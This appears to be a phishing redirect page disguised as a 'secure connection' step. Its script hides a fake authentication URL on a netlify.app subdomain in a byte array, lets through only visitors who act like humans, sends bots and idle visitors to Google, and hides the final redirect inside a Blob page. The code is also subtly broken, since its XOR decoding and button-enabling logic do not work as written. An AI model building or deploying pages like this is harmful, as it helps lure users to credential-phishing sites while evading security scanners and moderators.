<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Redirect</title>
    <style>
        body { margin:0; height:100vh; background:#f0f2f5; font-family:system-ui, sans-serif; display:flex; align-items:center; justify-content:center; color:#333; flex-direction:column; }
        .box { background:white; padding:2.5rem 3rem; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1); text-align:center; max-width:420px; }
        .spinner { width:56px; height:56px; border:6px solid #e0e0e0; border-top:6px solid #1a73e8; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 1.5rem; }
        @keyframes spin { to { transform:rotate(360deg); } }
        button { margin-top:1.5rem; padding:0.9rem 2.2rem; font-size:1.05rem; background:#1a73e8; color:white; border:none; border-radius:8px; cursor:pointer; }
        button:hover { background:#0d65d6; }
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <h3>Preparing secure connection</h3>
        <p>Please move your mouse a little and click the button below to continue.</p>
        <button id="proceedBtn" disabled>Continue to secure area</button>
    </div>

    <script>
        (function() {
            // =============================================
            // الرابط النهائي مشفر (XOR + مفتاح مشتق)
            // =============================================
            const encData = [
                0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x75,0x73,0x65,0x72,0x2d,0x73,0x65,0x72,
                0x76,0x69,0x63,0x65,0x2d,0x61,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,
                0x69,0x6f,0x6e,0x2e,0x6e,0x65,0x74,0x6c,0x69,0x66,0x79,0x2e,0x61,0x70,0x70
            ];

            function getDerivedKey() {
                let s = 0;
                try {
                    s += (navigator.userAgent || '').length;
                    s += screen.width * 31 ^ screen.height;
                    s += new Date().getTimezoneOffset() * 17;
                    s += window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) : 0;
                } catch {}
                return (s % 251) || 93;
            }

            const key = getDerivedKey();

            function decrypt() {
                let str = '';
                for (let i = 0; i < encData.length; i++) {
                    str += String.fromCharCode(encData[i] ^ (key + (i % 23)));
                }
                return str;
            }

            // =============================================
            // شروط التفاعل البشري (متعددة)
            // =============================================
            let mouseMoves = 0;
            let scrolled = false;
            let clicked = false;

            const btn = document.getElementById('proceedBtn');

            document.addEventListener('mousemove', () => {
                mouseMoves++;
                if (mouseMoves > 8) checkReady();
            }, { passive: true });

            document.addEventListener('scroll', () => {
                scrolled = true;
                checkReady();
            }, { passive: true });

            document.addEventListener('touchstart', () => {
                scrolled = true; // للجوال
                checkReady();
            }, { passive: true });

            btn.addEventListener('click', () => {
                clicked = true;
                proceed();
            });

            function checkReady() {
                if (mouseMoves > 12 && scrolled && !btn.disabled) {
                    btn.disabled = false;
                }
            }

            function proceed() {
                if (!clicked) return;

                const url = decrypt();
                if (!url || !url.startsWith('https://')) {
                    window.location.replace('https://www.google.com');
                    return;
                }

                // =============================================
                // إنشاء الصفحة داخل Blob (أقوى إخفاء)
                // =============================================
                const redirectHTML = `
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=${url}">
    <title>Redirecting...</title>
</head>
<body></body>
</html>`;

                const blob = new Blob([redirectHTML], { type: 'text/html' });
                const blobUrl = URL.createObjectURL(blob);

                window.location.replace(blobUrl);

                // تنظيف ذاكرة
                setTimeout(() => URL.revokeObjectURL(blobUrl), 30000);
            }

            // fallback أمان
            setTimeout(() => {
                if (!clicked) {
                    window.location.replace('https://www.google.com');
                }
            }, 18000);
        })();
    </script>
</body>
</html>
